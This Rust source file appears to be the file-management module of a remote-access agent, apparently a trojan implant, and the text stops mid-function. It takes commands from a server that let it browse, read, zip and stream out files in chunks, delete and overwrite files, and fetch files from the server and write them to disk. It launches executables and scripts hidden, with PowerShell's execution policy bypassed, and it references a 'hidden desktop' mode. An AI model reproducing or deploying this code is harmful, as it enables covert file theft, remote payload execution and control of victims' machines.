use std::{
    collections::VecDeque,
    fs::{self, File, OpenOptions},
    io::{Read, Seek, SeekFrom, Write},
    path::{Path, PathBuf},
    time::{Duration, Instant},
};

use anyhow::{Context, Result, bail};
use sha2::Digest;

use crate::{
    commands::{Ctx, net},
    protocol::{self, Obj, Value},
};

const DOWNLOAD_CHUNK: usize = 4 * 1024 * 1024;
const DEFAULT_READ_MAX: u64 = 10 * 1024 * 1024;
const PEEK_MAX: usize = 4096;

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "file_list" => file_list(&ctx).await,
        "file_request_access" => {
            #[cfg(target_os = "macos")]
            {
                ctx.out.result(&ctx.command, true, None).await;
            }
            #[cfg(not(target_os = "macos"))]
            {
                ctx.out
                    .result(&ctx.command, false, Some("file access requests are only supported on macOS"))
                    .await;
            }
        }
        "file_download" => file_download(&ctx).await,
        "file_upload" => file_upload(&ctx).await,
        "file_upload_http" | "file_upload_desktop" => file_upload_http(&ctx).await,
        "file_delete" => file_delete(&ctx).await,
        "file_mkdir" => file_mkdir(&ctx).await,
        "file_zip" => file_zip(&ctx).await,
        "file_read" => file_read(&ctx).await,
        "file_write" => file_write(&ctx).await,
        "file_search" => file_search(&ctx).await,
        "file_copy" => file_copy(&ctx).await,
        "file_move" => file_move(&ctx).await,
        "file_chmod" => file_chmod(&ctx).await,
        "file_execute" => file_execute(&ctx).await,
        "file_icon" => file_icon(&ctx).await,
        "file_thumb" => file_thumb(&ctx).await,
        "file_dirsize" => file_dirsize(&ctx).await,
        "file_peek" => file_peek(&ctx).await,
        "file_hash" => file_hash(&ctx).await,
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown file command"))
                .await
        }
    }
}

fn path_value(path: &Path) -> String {
    path.to_string_lossy().into_owned()
}

fn entry_value(path: &Path) -> Option<Value> {
    let metadata = fs::symlink_metadata(path).ok()?;
    let name = path
        .file_name()
        .map(|value| value.to_string_lossy().into_owned())
        .unwrap_or_else(|| path_value(path));
    let mut object = Obj::new()
        .put(protocol::key_name(), protocol::s(&name))
        .put(protocol::key_path(), protocol::s(&path_value(path)))
        .put(protocol::key_is_dir(), protocol::b(metadata.is_dir()))
        .put(protocol::key_size(), protocol::n(metadata.len() as i64))
        .put(
            protocol::key_mod_time(),
            protocol::n(
                metadata
                    .modified()
                    .ok()
                    .and_then(|time| time.duration_since(std::time::UNIX_EPOCH).ok())
                    .map(|duration| duration.as_secs() as i64)
                    .unwrap_or(0),
            ),
        );
    #[cfg(windows)]
    {
        use std::os::windows::fs::MetadataExt;
        object = object.put(protocol::key_attrs(), protocol::n(metadata.file_attributes() as i64));
    }
    Some(object.value())
}

fn directory_entries(directory: &Path) -> Result<Vec<Value>, std::io::Error> {
    let mut entries = Vec::new();
    for entry in fs::read_dir(directory)? {
        let Ok(entry) = entry else { continue };
        if let Some(value) = entry_value(&entry.path()) {
            entries.push(value);
        }
    }
    entries.sort_by(|left, right| {
        let left_dir = protocol::bool_field(left, "isDir").unwrap_or(false);
        let right_dir = protocol::bool_field(right, "isDir").unwrap_or(false);
        let left_name = protocol::string_field(left, "name").unwrap_or("");
        let right_name = protocol::string_field(right, "name").unwrap_or("");
        right_dir
            .cmp(&left_dir)
            .then_with(|| left_name.to_lowercase().cmp(&right_name.to_lowercase()))
    });
    Ok(entries)
}

async fn file_list(ctx: &Ctx) {
    let requested = ctx.string("path").unwrap_or("");
    let mut result_path = requested.to_owned();
    #[cfg(windows)]
    let entries = if requested.is_empty() || requested == "/" || requested == "\\" {
        let drives = crate::win::shell::drives();
        let mut values = Vec::new();
        for drive in drives {
            values.push(
                Obj::new()
                    .put(protocol::key_name(), protocol::s(&drive.name))
                    .put(protocol::key_path(), protocol::s(&drive.path))
                    .put(protocol::key_is_dir(), protocol::b(true))
                    .put(protocol::key_size(), protocol::n(0))
                    .put(protocol::key_mod_time(), protocol::n(0))
                    .put(protocol::key_free_bytes(), protocol::n(drive.free as i64))
                    .put(protocol::key_total_bytes(), protocol::n(drive.total as i64))
                    .put(protocol::key_fs_type(), protocol::s(&drive.fs))
                    .value(),
            );
        }
        result_path = "/".to_owned();
        Ok(values)
    } else {
        directory_entries(Path::new(requested))
    };
    #[cfg(not(windows))]
    let entries = {
        let path = if requested.is_empty() || requested == "/" {
            std::env::var_os("HOME").map(PathBuf::from).unwrap_or_else(|| PathBuf::from("/"))
        } else {
            PathBuf::from(requested)
        };
        result_path = path_value(&path);
        directory_entries(&path)
    };

    let mut object = Obj::new()
        .put(protocol::key_type(), protocol::s("file_list_result"))
        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
        .put(protocol::key_path(), protocol::s(&result_path));
    match entries {
        Ok(entries) => {
            object = object.put(protocol::key_entries(), protocol::arr(entries));
        }
        Err(error) => {
            let denied = error.kind() == std::io::ErrorKind::PermissionDenied;
            object = object
                .put(protocol::key_entries(), protocol::arr(Vec::new()))
                .put(protocol::key_error(), protocol::s(&error.to_string()))
                .put(protocol::key_access_denied(), protocol::b(denied));
        }
    }
    ctx.out.send(object.value()).await;
}

async fn file_download(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("").to_owned();
    let out = ctx.out.clone();
    let command = ctx.command.clone();
    tokio::task::spawn_blocking(move || {
        let mut file = match File::open(&path) {
            Ok(file) => file,
            Err(error) => {
                out.blocking_send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("file_download"))
                        .put(protocol::key_command_id(), protocol::s(&command.id))
                        .put(protocol::key_path(), protocol::s(&path))
                        .put(protocol::key_error(), protocol::s(&error.to_string()))
                        .value(),
                );
                return;
            }
        };
        let total = file.metadata().map(|metadata| metadata.len()).unwrap_or(0);
        let chunks = (total as usize).div_ceil(DOWNLOAD_CHUNK).max(1);
        let mut buffer = vec![0u8; DOWNLOAD_CHUNK];
        let mut offset = 0u64;
        loop {
            match file.read(&mut buffer) {
                Ok(0) => break,
                Ok(read) => {
                    let index = (offset as usize) / DOWNLOAD_CHUNK;
                    out.blocking_send(
                        Obj::new()
                            .put(protocol::key_type(), protocol::s("file_download"))
                            .put(protocol::key_command_id(), protocol::s(&command.id))
                            .put(protocol::key_path(), protocol::s(&path))
                            .put(protocol::key_data(), protocol::bin(buffer[..read].to_vec()))
                            .put(protocol::key_offset(), protocol::n(offset as i64))
                            .put(protocol::key_total(), protocol::n(total as i64))
                            .put(protocol::key_chunk_index(), protocol::n(index as i64))
                            .put(protocol::key_chunks_total(), protocol::n(chunks as i64))
                            .value(),
                    );
                    offset += read as u64;
                }
                Err(error) => {
                    out.blocking_send(
                        Obj::new()
                            .put(protocol::key_type(), protocol::s("file_download"))
                            .put(protocol::key_command_id(), protocol::s(&command.id))
                            .put(protocol::key_path(), protocol::s(&path))
                            .put(protocol::key_error(), protocol::s(&error.to_string()))
                            .value(),
                    );
                    break;
                }
            }
        }
    })
    .await
    .ok();
}

async fn file_upload(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("").to_owned();
    let data = ctx.bytes("data").unwrap_or(&[]).to_vec();
    let offset = ctx.integer("offset").unwrap_or(0).max(0) as u64;
    let total = ctx.integer("total").unwrap_or(0).max(0) as u64;
    let transfer_id = ctx.string("transferId").unwrap_or("").to_owned();
    let out = ctx.out.clone();
    let command = ctx.command.clone();
    tokio::task::spawn_blocking(move || {
        let result = write_upload(&path, &data, offset, total, &transfer_id);
        let value = match result {
            Ok((written, received)) => Obj::new()
                .put(protocol::key_type(), protocol::s("file_upload_result"))
                .put(protocol::key_command_id(), protocol::s(&command.id))
                .put(protocol::key_transfer_id(), protocol::s(&transfer_id))
                .put(protocol::key_path(), protocol::s(&path))
                .put(protocol::key_ok(), protocol::b(true))
                .put(protocol::key_offset(), protocol::n(offset as i64))
                .put(protocol::key_size(), protocol::n(written as i64))
                .put(protocol::key_received(), protocol::n(received as i64))
                .put(protocol::key_total(), protocol::n(total as i64))
                .value(),
            Err(error) => Obj::new()
                .put(protocol::key_type(), protocol::s("file_upload_result"))
                .put(protocol::key_command_id(), protocol::s(&command.id))
                .put(protocol::key_transfer_id(), protocol::s(&transfer_id))
                .put(protocol::key_path(), protocol::s(&path))
                .put(protocol::key_ok(), protocol::b(false))
                .put(protocol::key_error(), protocol::s(&error))
                .value(),
        };
        out.blocking_send(value);
    })
    .await
    .ok();
}

fn write_upload(
    path: &str,
    data: &[u8],
    offset: u64,
    total: u64,
    transfer_id: &str,
) -> Result<(u64, u64), String> {
    let target = Path::new(path);
    if let Some(parent) = target.parent() {
        fs::create_dir_all(parent).map_err(|error| error.to_string())?;
    }
    if total == 0 {
        let mut file = OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(target)
            .map_err(|error| error.to_string())?;
        file.write_all(data).map_err(|error| error.to_string())?;
        let size = file.metadata().map(|metadata| metadata.len()).unwrap_or(0);
        return Ok((size, size));
    }
    let temp = if transfer_id.is_empty() {
        PathBuf::from(format!("{path}.uploading"))
    } else {
        PathBuf::from(format!("{path}.uploading.{transfer_id}"))
    };
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .open(&temp)
        .map_err(|error| error.to_string())?;
    file.seek(SeekFrom::Start(offset))
        .map_err(|error| error.to_string())?;
    file.write_all(data).map_err(|error| error.to_string())?;
    file.flush().map_err(|error| error.to_string())?;
    let received = offset + data.len() as u64;
    if received >= total {
        fs::rename(&temp, target).map_err(|error| error.to_string())?;
    }
    Ok((received, received))
}

async fn file_upload_http(ctx: &Ctx) {
    if ctx.command.name == "file_upload_desktop" {
        let active = ctx
            .state
            .backstage
            .lock()
            .map(|guard| guard.is_some())
            .unwrap_or(false)
            || ctx
                .state
                .virtual_stream
                .lock()
                .map(|guard| guard.is_some())
                .unwrap_or(false);
        if active {
            ctx.out
                .result(&ctx.command, false, Some("file drop is unavailable while a hidden desktop is active"))
                .await;
            return;
        }
    }
    let path = ctx.string("path").unwrap_or("").to_owned();
    let url = ctx.string("url").unwrap_or("").to_owned();
    let server = ctx
        .state
        .config
        .servers
        .first()
        .map(|server| server.as_str().to_owned())
        .unwrap_or_default();
    let resolved = net::resolve_url(&server, &url);
    let config = ctx.state.config.clone();
    match net::get(&resolved, config.insecure_tls, &config.tls_spki_pins).await {
        Ok(data) => {
            let result = write_upload(&path, &data, 0, 0, "");
            match result {
                Ok((size, _)) => {
                    ctx.out
                        .result(&ctx.command, true, Some(&format!("{size} bytes")))
                        .await
                }
                Err(error) => ctx.out.result(&ctx.command, false, Some(&error)).await,
            }
        }
        Err(error) => ctx.out.result(&ctx.command, false, Some(&error)).await,
    }
}

async fn file_delete(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("");
    let metadata = fs::metadata(path);
    let result = match metadata {
        Ok(metadata) if metadata.is_dir() => fs::remove_dir_all(path),
        Ok(_) => fs::remove_file(path),
        Err(error) => Err(error),
    };
    match result {
        Ok(()) => ctx.out.result(&ctx.command, true, None).await,
        Err(error) => ctx.out.result(&ctx.command, false, Some(&error.to_string())).await,
    }
}

async fn file_mkdir(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("");
    match fs::create_dir_all(path) {
        Ok(()) => ctx.out.result(&ctx.command, true, None).await,
        Err(error) => ctx.out.result(&ctx.command, false, Some(&error.to_string())).await,
    }
}

fn collect_files(path: &Path, files: &mut Vec<PathBuf>) -> Result<(), std::io::Error> {
    if path.is_file() {
        files.push(path.to_path_buf());
        return Ok(());
    }
    for entry in fs::read_dir(path)? {
        let Ok(entry) = entry else { continue };
        let path = entry.path();
        if path.is_dir() {
            collect_files(&path, files)?;
        } else {
            files.push(path);
        }
    }
    Ok(())
}

async fn file_zip(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("").to_owned();
    let out = ctx.out.clone();
    let command = ctx.command.clone();
    let state = ctx.state.clone();
    let cancel = state.register_cancellable(&command.id);
    tokio::task::spawn_blocking(move || {
        let target = Path::new(&path);
        let mut files = Vec::new();
        if let Err(error) = collect_files(target, &mut files) {
            out.blocking_send(
                Obj::new()
                    .put(protocol::key_type(), protocol::s("command_result"))
                    .put(protocol::key_command_id(), protocol::s(&command.id))
                    .put(protocol::key_ok(), protocol::b(false))
                    .put(protocol::key_message(), protocol::s(&error.to_string()))
                    .value(),
            );
            state.clear_cancellable(&command.id);
            return;
        }
        let zip_path = format!("{path}.zip");
        let file = match File::create(&zip_path) {
            Ok(file) => file,
            Err(error) => {
                out.blocking_send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("command_result"))
                        .put(protocol::key_command_id(), protocol::s(&command.id))
                        .put(protocol::key_ok(), protocol::b(false))
                        .put(protocol::key_message(), protocol::s(&error.to_string()))
                        .value(),
                );
                state.clear_cancellable(&command.id);
                return;
            }
        };
        let mut writer = zip::ZipWriter::new(file);
        let options = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        let total = files.len();
        let mut failed = 0usize;
        for (index, file_path) in files.iter().enumerate() {
            if cancel.is_cancelled() {
                break;
            }
            let relative = file_path
                .strip_prefix(target)
                .map(|value| value.to_string_lossy().replace('\\', "/"))
                .unwrap_or_else(|_| file_path.to_string_lossy().into_owned());
            if relative.is_empty() {
                continue;
            }
            if writer.start_file(relative, options).is_err() {
                failed += 1;
                continue;
            }
            match fs::read(file_path) {
                Ok(data) => {
                    if writer.write_all(&data).is_err() {
                        failed += 1;
                    }
                }
                Err(_) => failed += 1,
            }
            if index % 16 == 0 {
                out.blocking_send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("command_progress"))
                        .put(protocol::key_command_id(), protocol::s(&command.id))
                        .put(protocol::key_ok(), protocol::b(true))
                        .put(
                            protocol::key_message(),
                            protocol::s(&format!("Zipping {}/{} files...", index + 1, total)),
                        )
                        .value(),
                );
            }
        }
        if let Err(error) = writer.finish() {
            out.blocking_send(
                Obj::new()
                    .put(protocol::key_type(), protocol::s("command_result"))
                    .put(protocol::key_command_id(), protocol::s(&command.id))
                    .put(protocol::key_ok(), protocol::b(false))
                    .put(protocol::key_message(), protocol::s(&error.to_string()))
                    .value(),
            );
            state.clear_cancellable(&command.id);
            return;
        }
        if cancel.is_cancelled() {
            let _ = fs::remove_file(&zip_path);
            out.blocking_send(
                Obj::new()
                    .put(protocol::key_type(), protocol::s("command_result"))
                    .put(protocol::key_command_id(), protocol::s(&command.id))
                    .put(protocol::key_ok(), protocol::b(false))
                    .put(protocol::key_message(), protocol::s("cancelled"))
                    .value(),
            );
            state.clear_cancellable(&command.id);
            return;
        }
        // Stream the archive as file_download chunks.
        if let Ok(data) = fs::read(&zip_path) {
            let total_bytes = data.len();
            let chunks = total_bytes.div_ceil(DOWNLOAD_CHUNK).max(1);
            for (index, chunk) in data.chunks(DOWNLOAD_CHUNK).enumerate() {
                out.blocking_send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("file_download"))
                        .put(protocol::key_command_id(), protocol::s(&command.id))
                        .put(protocol::key_path(), protocol::s(&zip_path))
                        .put(protocol::key_data(), protocol::bin(chunk.to_vec()))
                        .put(protocol::key_offset(), protocol::n((index * DOWNLOAD_CHUNK) as i64))
                        .put(protocol::key_total(), protocol::n(total_bytes as i64))
                        .put(protocol::key_chunk_index(), protocol::n(index as i64))
                        .put(protocol::key_chunks_total(), protocol::n(chunks as i64))
                        .value(),
                );
            }
        }
        let message = if failed == 0 {
            format!("Zip created: {zip_path}")
        } else {
            format!("Zip created with {failed} skipped files: {zip_path}")
        };
        out.blocking_send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("command_result"))
                .put(protocol::key_command_id(), protocol::s(&command.id))
                .put(protocol::key_ok(), protocol::b(true))
                .put(protocol::key_message(), protocol::s(&message))
                .value(),
        );
        state.clear_cancellable(&command.id);
    })
    .await
    .ok();
}

async fn file_read(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("");
    let max_size = ctx
        .integer("maxSize")
        .unwrap_or(0)
        .max(0) as u64;
    let max_size = if max_size == 0 { DEFAULT_READ_MAX } else { max_size };
    let mut object = Obj::new()
        .put(protocol::key_type(), protocol::s("file_read_result"))
        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
        .put(protocol::key_path(), protocol::s(path));
    match fs::metadata(path) {
        Ok(metadata) if metadata.len() > max_size => {
            object = object.put(
                protocol::key_error(),
                protocol::s(&format!(
                    "file too large: {} bytes (max: {max_size})",
                    metadata.len()
                )),
            );
        }
        Ok(_) => match fs::read(path) {
            Ok(data) => {
                let is_binary = std::str::from_utf8(&data).is_err();
                object = object
                    .put(protocol::key_content(), protocol::s(&String::from_utf8_lossy(&data)))
                    .put(protocol::key_is_binary(), protocol::b(is_binary));
            }
            Err(error) => {
                object = object.put(protocol::key_error(), protocol::s(&error.to_string()));
            }
        },
        Err(error) => {
            object = object.put(protocol::key_error(), protocol::s(&error.to_string()));
        }
    }
    ctx.out.send(object.value()).await;
}

async fn file_write(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("");
    let content = ctx.string("content").unwrap_or("");
    let result = (|| -> Result<()> {
        if let Some(parent) = Path::new(path).parent() {
            fs::create_dir_all(parent)?;
        }
        fs::write(path, content.as_bytes())?;
        Ok(())
    })();
    match result {
        Ok(()) => ctx.out.result(&ctx.command, true, None).await,
        Err(error) => ctx.out.result(&ctx.command, false, Some(&error.to_string())).await,
    }
}

async fn file_search(ctx: &Ctx) {
    let search_id = ctx.string("searchId").unwrap_or("").to_owned();
    let root = ctx.string("path").unwrap_or("").to_owned();
    let pattern = ctx.string("pattern").unwrap_or("").to_lowercase();
    let content = ctx.boolean_or("searchContent", false);
    let max_results = ctx.integer("maxResults").unwrap_or(0);
    let max_results = if max_results <= 0 { 1000 } else { max_results as usize };
    let out = ctx.out.clone();
    let command = ctx.command.clone();
    tokio::task::spawn_blocking(move || {
        let mut matches = Vec::new();
        let mut queue = VecDeque::new();
        queue.push_back(PathBuf::from(&root));
        while let Some(directory) = queue.pop_front() {
            if matches.len() >= max_results {
                break;
            }
            let Ok(entries) = fs::read_dir(&directory) else { continue };
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    queue.push_back(path);
                    continue;
                }
                let name = path
                    .file_name()
                    .map(|value| value.to_string_lossy().to_lowercase())
                    .unwrap_or_default();
                if name.contains(&pattern) {
                    matches.push(
                        Obj::new()
                            .put(protocol::key_path(), protocol::s(&path_value(&path)))
                            .value(),
                    );
                    if matches.len() >= max_results {
                        break;
                    }
                }
                if content {
                    let Ok(metadata) = fs::metadata(&path) else { continue };
                    if metadata.len() > 10 * 1024 * 1024 {
                        continue;
                    }
                    let Ok(data) = fs::read_to_string(&path) else { continue };
                    for (index, line) in data.lines().enumerate() {
                        if line.to_lowercase().contains(&pattern) {
                            matches.push(
                                Obj::new()
                                    .put(protocol::key_path(), protocol::s(&path_value(&path)))
                                    .put(protocol::key_line(), protocol::n((index + 1) as i64))
                                    .put(protocol::key_match(), protocol::s(line))
                                    .value(),
                            );
                            if matches.len() >= max_results {
                                break;
                            }
                        }
                    }
                }
            }
        }
        out.blocking_send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("file_search_result"))
                .put(protocol::key_command_id(), protocol::s(&command.id))
                .put(protocol::key_search_id(), protocol::s(&search_id))
                .put(protocol::key_results(), protocol::arr(matches))
                .put(protocol::key_complete(), protocol::b(true))
                .value(),
        );
    })
    .await
    .ok();
}

async fn file_copy(ctx: &Ctx) {
    let source = ctx.string("source").unwrap_or("");
    let destination = ctx.string("dest").unwrap_or("");
    let result = (|| -> Result<u64> {
        if let Some(parent) = Path::new(destination).parent() {
            fs::create_dir_all(parent)?;
        }
        Ok(fs::copy(source, destination)?)
    })();
    match result {
        Ok(bytes) => {
            ctx.out
                .result(&ctx.command, true, Some(&format!("{bytes} bytes")))
                .await
        }
        Err(error) => ctx.out.result(&ctx.command, false, Some(&error.to_string())).await,
    }
}

async fn file_move(ctx: &Ctx) {
    let source = ctx.string("source").unwrap_or("");
    let destination = ctx.string("dest").unwrap_or("");
    let result = (|| -> Result<()> {
        if let Some(parent) = Path::new(destination).parent() {
            fs::create_dir_all(parent)?;
        }
        fs::rename(source, destination)?;
        Ok(())
    })();
    match result {
        Ok(()) => ctx.out.result(&ctx.command, true, None).await,
        Err(error) => ctx.out.result(&ctx.command, false, Some(&error.to_string())).await,
    }
}

async fn file_chmod(ctx: &Ctx) {
    #[cfg(windows)]
    {
        let _ = ctx.string("mode");
        ctx.out
            .result(&ctx.command, false, Some("chmod not supported on Windows"))
            .await;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let path = ctx.string("path").unwrap_or("");
        let mode = u32::from_str_radix(ctx.string("mode").unwrap_or("644"), 8).unwrap_or(0o644);
        match fs::set_permissions(path, fs::Permissions::from_mode(mode)) {
            Ok(()) => ctx.out.result(&ctx.command, true, None).await,
            Err(error) => ctx.out.result(&ctx.command, false, Some(&error.to_string())).await,
        }
    }
}

async fn file_execute(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("").to_owned();
    let extension = Path::new(&path)
        .extension()
        .map(|value| value.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    let result = spawn_file(&path, &extension);
    match result {
        Ok(()) => ctx.out.result(&ctx.command, true, None).await,
        Err(error) => ctx.out.result(&ctx.command, false, Some(&error)).await,
    }
}

fn spawn_file(path: &str, extension: &str) -> Result<(), String> {
    use std::process::Command;
    let mut command = match extension {
        "exe" | "com" => Command::new(path),
        "bat" | "cmd" => {
            let mut command = Command::new("cmd.exe");
            command.args(["/C", path]);
            command
        }
        "ps1" => {
            let mut command = Command::new("powershell.exe");
            command.args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", path]);
            command
        }
        "vbs" | "js" => {
            let mut command = Command::new("wscript.exe");
            command.arg(path);
            command
        }
        "py" => {
            let mut command = Command::new("python.exe");
            command.arg(path);
            command
        }
        _ => return Err("unsupported file type".to_owned()),
    };
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        command.creation_flags(0x08000000);
    }
    command.spawn().map(|_| ()).map_err(|error| error.to_string())
}

async fn file_icon(ctx: &Ctx) {
    let items = protocol::array_field(ctx.payload(), "items");
    let mut icons = Vec::new();
    for item in items {
        let key = protocol::string_field(item, "key").unwrap_or("");
        let path = protocol::string_field(item, "path").unwrap_or("");
        let extension = protocol::string_field(item, "ext").unwrap_or("");
        #[cfg(windows)]
        let icon = if !path.is_empty() {
            crate::win::shell::file_icon_png(path)
        } else {
            crate::win::shell::file_icon_png_for_extension(extension)
        };
        #[cfg(not(windows))]
        let icon: Result<Vec<u8>, String> = Err("icons are only available on Windows".to_owned());
        let entry = match icon {
            Ok(png) => Obj::new()
                .put(protocol::key_key(), protocol::s(key))
                .put(protocol::key_png(), protocol::bin(png))
                .value(),
            Err(error) => Obj::new()
                .put(protocol::key_key(), protocol::s(key))
                .put(protocol::key_error(), protocol::s(&error))
                .value(),
        };
        icons.push(entry);
    }
    ctx.out
        .send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("file_icon_result"))
                .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                .put(protocol::key_icons(), protocol::arr(icons))
                .value(),
        )
        .await;
}

async fn file_thumb(ctx: &Ctx) {
    let items = protocol::array_field(ctx.payload(), "items");
    let mut thumbs = Vec::new();
    for item in items {
        let key = protocol::string_field(item, "key").unwrap_or("").to_owned();
        let path = protocol::string_field(item, "path").unwrap_or("").to_owned();
        let size = protocol::integer_field(item, "size").unwrap_or(128).max(16) as u32;
        let entry = tokio::task::spawn_blocking(move || {
            #[cfg(windows)]
            let thumb = crate::win::shell::thumbnail_jpeg(&path, size);
            #[cfg(not(windows))]
            let thumb: Result<(Vec<u8>, u32, u32), String> =
                Err("thumbnails are only available on Windows".to_owned());
            match thumb {
                Ok((jpeg, width, height)) => Obj::new()
                    .put(protocol::key_key(), protocol::s(&key))
                    .put(protocol::key_jpeg(), protocol::bin(jpeg))
                    .put(protocol::key_w(), protocol::n(width as i64))
                    .put(protocol::key_h(), protocol::n(height as i64))
                    .value(),
                Err(error) => Obj::new()
                    .put(protocol::key_key(), protocol::s(&key))
                    .put(protocol::key_error(), protocol::s(&error))
                    .value(),
            }
        })
        .await
        .unwrap_or_else(|_| {
            Obj::new()
                .put(protocol::key_key(), protocol::s(""))
                .put(protocol::key_error(), protocol::s("thumbnail task failed"))
                .value()
        });
        thumbs.push(entry);
    }
    ctx.out
        .send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("file_thumb_result"))
                .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                .put(protocol::key_thumbs(), protocol::arr(thumbs))
                .value(),
        )
        .await;
}

async fn file_dirsize(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("").to_owned();
    let out = ctx.out.clone();
    let command = ctx.command.clone();
    let state = ctx.state.clone();
    let cancel = state.register_cancellable(&command.id);
    tokio::task::spawn_blocking(move || {
        let mut bytes = 0i64;
        let mut files = 0i64;
        let mut dirs = 0i64;
        let mut queue = VecDeque::new();
        queue.push_back(PathBuf::from(&path));
        let mut last = Instant::now();
        while let Some(directory) = queue.pop_front() {
            if cancel.is_cancelled() {
                state.clear_cancellable(&command.id);
                return;
            }
            let Ok(entries) = fs::read_dir(&directory) else { continue };
            for entry in entries.flatten() {
                let entry_path = entry.path();
                if entry_path.is_dir() {
                    dirs += 1;
                    queue.push_back(entry_path);
                } else if let Ok(metadata) = entry.metadata() {
                    files += 1;
                    bytes += metadata.len() as i64;
                }
            }
            if last.elapsed() >= Duration::from_millis(400) {
                last = Instant::now();
                out.blocking_send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("file_dirsize_result"))
                        .put(protocol::key_command_id(), protocol::s(&command.id))
                        .put(protocol::key_path(), protocol::s(&path))
                        .put(protocol::key_bytes(), protocol::n(bytes))
                        .put(protocol::key_files(), protocol::n(files))
                        .put(protocol::key_dirs(), protocol::n(dirs))
                        .put(protocol::key_done(), protocol::b(false))
                        .value(),
                );
            }
        }
        out.blocking_send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("file_dirsize_result"))
                .put(protocol::key_command_id(), protocol::s(&command.id))
                .put(protocol::key_path(), protocol::s(&path))
                .put(protocol::key_bytes(), protocol::n(bytes))
                .put(protocol::key_files(), protocol::n(files))
                .put(protocol::key_dirs(), protocol::n(dirs))
                .put(protocol::key_done(), protocol::b(true))
                .value(),
        );
        state.clear_cancellable(&command.id);
    })
    .await
    .ok();
}

async fn file_peek(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("");
    let requested = ctx.integer("bytes").unwrap_or(0);
    let requested = if requested <= 0 || requested as usize > PEEK_MAX {
        PEEK_MAX
    } else {
        requested as usize
    };
    let metadata = fs::metadata(path);
    let size = metadata.as_ref().map(|metadata| metadata.len()).unwrap_or(0);
    let mut object = Obj::new()
        .put(protocol::key_type(), protocol::s("file_peek_result"))
        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
        .put(protocol::key_path(), protocol::s(path))
        .put(protocol::key_size(), protocol::n(size as i64));
    match File::open(path) {
        Ok(mut file) => {
            let mut buffer = vec![0u8; requested];
            let read = file.read(&mut buffer).unwrap_or(0);
            let data = &buffer[..read];
            object = object
                .put(protocol::key_data(), protocol::bin(data.to_vec()))
                .put(protocol::key_is_text(), protocol::b(looks_like_text(data)));
        }
        Err(error) => {
            object = object.put(protocol::key_error(), protocol::s(&error.to_string()));
        }
    }
    ctx.out.send(object.value()).await;
}

fn looks_like_text(data: &[u8]) -> bool {
    if data.is_empty() {
        return true;
    }
    if std::str::from_utf8(data).is_err() {
        return false;
    }
    !data.contains(&0)
}

async fn file_hash(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("").to_owned();
    let algorithm = ctx.string("algorithm").unwrap_or("").to_lowercase();
    let algorithm = if algorithm.is_empty() { "sha256".to_owned() } else { algorithm };
    let out = ctx.out.clone();
    let command = ctx.command.clone();
    let state = ctx.state.clone();
    let cancel = state.register_cancellable(&command.id);
    tokio::task::spawn_blocking(move || {
        let mut object = Obj::new()
            .put(protocol::key_type(), protocol::s("file_hash_result"))
            .put(protocol::key_command_id(), protocol::s(&command.id))
            .put(protocol::key_path(), protocol::s(&path))
            .put(protocol::key_algorithm(), protocol::s(&algorithm));
        let result = (|| -> Result<(String, u64)> {
            let metadata = fs::metadata(&path)?;
            if metadata.is_dir() {
                bail!("path is a directory");
            }
            let mut file = File::open(&path)?;
            let mut buffer = vec![0u8; 256 * 1024];
            let digest = match algorithm.as_str() {
                "sha256" => {
                    let mut hasher = sha2::Sha256::new();
                    loop {
                        if cancel.is_cancelled() {
                            bail!("cancelled");
                        }
                        let read = file.read(&mut buffer)?;
                        if read == 0 {
                            break;
                        }
                        hasher.update(&buffer[..read]);
                    }
                    hex(&hasher.finalize())
                }
                "sha1" => {
                    let mut hasher = sha1::Sha1::new();
                    loop {
                        let read = file.read(&mut buffer)?;
                        if read == 0 {
                            break;
                        }
                        hasher.update(&buffer[..read]);
                    }
                    hex(&hasher.finalize())
                }
                "md5" => {
                    let mut hasher = md5::Md5::new();
                    loop {
                        let read = file.read(&mut buffer)?;
                        if read == 0 {
                            break;
                        }
                        hasher.update(&buffer[..read]);
                    }
                    hex(&hasher.finalize())
                }
                "crc32" => {
                    let mut hasher = crc32fast::Hasher::new();
                    loop {
                        let read = file.read(&mut buffer)?;
                        if read == 0 {
                            break;
                        }
                        hasher.update(&buffer[..read]);
                    }
                    format!("{:08x}", hasher.finalize())
                }
                _ => bail!("unsupported algorithm"),
            };
            Ok((digest, metadata.len()))
        })();
        match result {
            Ok((digest, size)) => {
                object = object
                    .put(protocol::key_digest(), protocol::s(&digest))
                    .put(protocol::key_size(), protocol::n(size as i64));
            }
            Err(error) => {
